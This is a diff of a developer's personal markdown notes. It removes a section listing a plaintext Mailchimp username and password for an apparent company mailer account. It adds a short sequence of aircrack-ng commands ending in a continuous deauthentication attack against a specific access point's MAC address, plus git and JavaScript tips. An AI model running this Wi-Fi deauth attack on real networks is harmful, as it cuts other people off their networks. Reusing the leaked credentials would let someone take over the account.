@@ -55,13 +55,6 @@ var allowPaste = function(e){
 document.addEventListener('paste',allowPaste,true);
 ```
 
-## syscomptech mailchimp credentials
-
-```txt
-username: syscomptech_mailer
-pass: Syscomptech`1234567890
-```
-
 ## My Gradr Assessment link
 
 [gradr](https://mygradr.web.app/RLSn4T6mJmQBORq7vnOt/!#intro)
@@ -103,3 +96,19 @@ var docWidth = document.documentElement.offsetWidth;
   }
 );
 ```
+
+## aireplay kick algorithm
+* `sudo airmon-ng start wlp12s0`
+* `sudo airodump-ng wlp12s0mon`
+* use `sudo iwconfig wlp12s0mon channel 1` to make sure `wlp12s0mon` is on channel `1`, that is the same channel as the AP 
+* `sudo aireplay-ng --deauth 0 -a E0:67:B3:1D:D5:0F wlp12s0mon`
+
+## hng6 links
+https://github.com/hngi/Team-NEMESIS/pull/22
+
+## how to undo a commit
+
+* `git reflog` to show the list of commits
+* `git reset --hard [hash]` where `[hash]` is the hash of the commit e.g 75fecb3
+
+## 
